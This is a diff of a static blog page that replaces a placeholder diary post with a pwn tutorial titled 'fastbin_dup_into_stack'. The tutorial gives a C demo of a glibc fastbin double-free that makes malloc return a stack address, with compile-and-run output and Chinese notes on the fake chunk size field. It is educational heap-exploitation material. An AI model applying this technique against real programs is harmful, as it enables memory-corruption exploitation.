@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="备忘," />
+  <meta name="keywords" content="pwn," />
 
 
 
@@ -79,16 +79,16 @@
 
 
 
-<meta name="description" content="Driving to the deep water">
+<meta name="description" content="1234567891011121314151617181920212223242526272829303132333435#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;int main()	&amp;#123;	unsigned long long stack_var &#x3D; 0x21;	fprintf(">
 <meta property="og:type" content="article">
-<meta property="og:title" content="备忘">
-<meta property="og:url" content="http://yoursite.com/2999/12/31/diary/index.html">
+<meta property="og:title" content="3.fastbin_dup_into_stack">
+<meta property="og:url" content="http://yoursite.com/2019/04/01/3.fastbin_dup_into_stack/index.html">
 <meta property="og:site_name" content="ha2">
-<meta property="og:description" content="Driving to the deep water">
-<meta property="article:published_time" content="2999-12-31T15:59:59.000Z">
-<meta property="article:modified_time" content="2019-02-15T06:29:24.461Z">
+<meta property="og:description" content="1234567891011121314151617181920212223242526272829303132333435#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;int main()	&amp;#123;	unsigned long long stack_var &#x3D; 0x21;	fprintf(">
+<meta property="article:published_time" content="2019-03-31T16:00:03.000Z">
+<meta property="article:modified_time" content="2021-03-15T03:46:11.933Z">
 <meta property="article:author" content="ha2">
-<meta property="article:tag" content="备忘">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
 
 
@@ -119,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2999/12/31/diary/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/04/01/3.fastbin_dup_into_stack/"/>
 
 
 
 
 
-  <title>备忘 | ha2</title>
+  <title>3.fastbin_dup_into_stack | ha2</title>
   
 
 
@@ -262,7 +262,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2999/12/31/diary/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/01/3.fastbin_dup_into_stack/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="ha2">
@@ -279,7 +279,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">备忘</h1>
+          <h1 class="post-title" itemprop="name headline">3.fastbin_dup_into_stack</h1>
         
 
         <div class="post-meta">
@@ -291,8 +291,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2999-12-31T23:59:59+08:00">
-                2999-12-31
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-01T00:00:03+08:00">
+                2019-04-01
               </time>
             
 
@@ -301,6 +301,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -329,7 +351,17 @@
       
 
       
-        <h3 id="Driving-to-the-deep-water"><a href="#Driving-to-the-deep-water" class="headerlink" title="Driving to the deep water"></a>Driving to the deep water</h3>
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main()	&#123;</span><br><span class="line">	unsigned long long stack_var &#x3D; 0x21;</span><br><span class="line">	fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);</span><br><span class="line">	char *a &#x3D; malloc(9);</span><br><span class="line">	char *b &#x3D; malloc(9);</span><br><span class="line">	char *c &#x3D; malloc(9);</span><br><span class="line">	strcpy(a, &quot;AAAAAAAA&quot;);</span><br><span class="line">	strcpy(b, &quot;BBBBBBBB&quot;);</span><br><span class="line">	strcpy(c, &quot;CCCCCCCC&quot;);</span><br><span class="line">	fprintf(stderr, &quot;1st malloc(9) %p points to %s\n&quot;, a, a);</span><br><span class="line">	fprintf(stderr, &quot;2nd malloc(9) %p points to %s\n&quot;, b, b);</span><br><span class="line">	fprintf(stderr, &quot;3rd malloc(9) %p points to %s\n&quot;, c, c);</span><br><span class="line">	fprintf(stderr, &quot;Freeing the first one %p.\n&quot;, a);</span><br><span class="line">	free(a);			</span><br><span class="line">	fprintf(stderr, &quot;Then	freeing another one	%p.\n&quot;, b);</span><br><span class="line">	free(b);</span><br><span class="line">	fprintf(stderr, &quot;Freeing the first one %p again.\n&quot;, a);</span><br><span class="line">	free(a);</span><br><span class="line">	fprintf(stderr, &quot;Allocating 4 buffers.\n&quot;);</span><br><span class="line">	unsigned long long *d &#x3D; malloc(9);</span><br><span class="line">	*d &#x3D; (unsigned long long) ( ( (char*)&amp;stack_var ) - sizeof(d) );</span><br><span class="line">	fprintf(stderr, &quot;4nd malloc(9) %p points to %p\n&quot;, d, &amp;d);</span><br><span class="line">	char *e &#x3D; malloc(9);</span><br><span class="line">	strcpy(e, &quot;EEEEEEEE&quot;);</span><br><span class="line">	fprintf(stderr, &quot;5nd malloc(9) %p points to %s\n&quot;, e, e);</span><br><span class="line">	char *f &#x3D; malloc(9);</span><br><span class="line">	strcpy(f, &quot;FFFFFFFF&quot;);</span><br><span class="line">	fprintf(stderr, &quot;6rd malloc(9) %p points	to %s\n&quot;,	f, f);</span><br><span class="line">	char *g &#x3D; malloc(9);</span><br><span class="line">	strcpy(g, &quot;GGGGGGGG&quot;);</span><br><span class="line">	fprintf(stderr, &quot;7th malloc(9) %p points to %s\n&quot;, g, g);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">user@ubuntu:~&#x2F;workspace&#x2F;pwn&#x2F;fastbin_dup_into_stack$ vim fastbin_dup_into_stack.c</span><br><span class="line">user@ubuntu:~&#x2F;workspace&#x2F;pwn&#x2F;fastbin_dup_into_stack$ gcc -g fastbin_dup_into_stack.c -o fastbin_dup_into_stack</span><br><span class="line">user@ubuntu:~&#x2F;workspace&#x2F;pwn&#x2F;fastbin_dup_into_stack$ .&#x2F;fastbin_dup_into_stack </span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(9) 0x214b010 points to AAAAAAAA</span><br><span class="line">2nd malloc(9) 0x214b030 points to BBBBBBBB</span><br><span class="line">3rd malloc(9) 0x214b050 points to CCCCCCCC</span><br><span class="line">Freeing the first one 0x214b010.</span><br><span class="line">Then	freeing another one	0x214b030.</span><br><span class="line">Freeing the first one 0x214b010 again.</span><br><span class="line">Allocating 4 buffers.</span><br><span class="line">4nd malloc(9) 0x214b010 points to 0x7ffc8bc6ce40</span><br><span class="line">5nd malloc(9) 0x214b030 points to EEEEEEEE</span><br><span class="line">6rd malloc(9) 0x214b010 points	to FFFFFFFF</span><br><span class="line">7th malloc(9) 0x7ffc8bc6ce40 points to GGGGGGGG</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>修改fd指针，将其指向一个伪造的free chunk，在伪造的地址处malloc出一个chunk.漏洞也同样是double-free，只有给fd填充的内容不一样.    stack_var被我们设置为0x21（或0x20都可以），其实是为了在栈地址减去0x8的时候作为fake chunk的size字段</p>
+</blockquote>
+<blockquote>
+<p>glibc    在执行分配操作时，若块的大小符合fast bin，则会在对应的bin中寻找合适的块，此时glibc将根据候选块的size字段计算出fastbin索引，然后与对应bin在fastbin中的索引进行比较，如果二者不匹配，则说明块的size字段遭到破坏。所以需要fake chunk的size字段被设置为正确的值。</p>
+</blockquote>
+
       
     </div>
     
@@ -346,7 +378,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E5%A4%87%E5%BF%98/" rel="tag"><i class="fa fa-tag"></i> 备忘</a>
+            <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
           
         </div>
       
@@ -359,8 +391,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/01/7.posion_null_byte/" rel="next" title="7.posion_null_byte">
-                <i class="fa fa-chevron-left"></i> 7.posion_null_byte
+              <a href="/2019/04/01/2.fastbin_dup/" rel="next" title="2.fastbin_dup">
+                <i class="fa fa-chevron-left"></i> 2.fastbin_dup
               </a>
             
           </div>
@@ -368,6 +400,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/01/4.fastbin_dup_consolidate/" rel="prev" title="4.fastbin_dup_consolidate">
+                4.fastbin_dup_consolidate <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -419,17 +455,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -505,22 +532,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Driving-to-the-deep-water"><span class="nav-number">1.</span> <span class="nav-text">Driving to the deep water</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
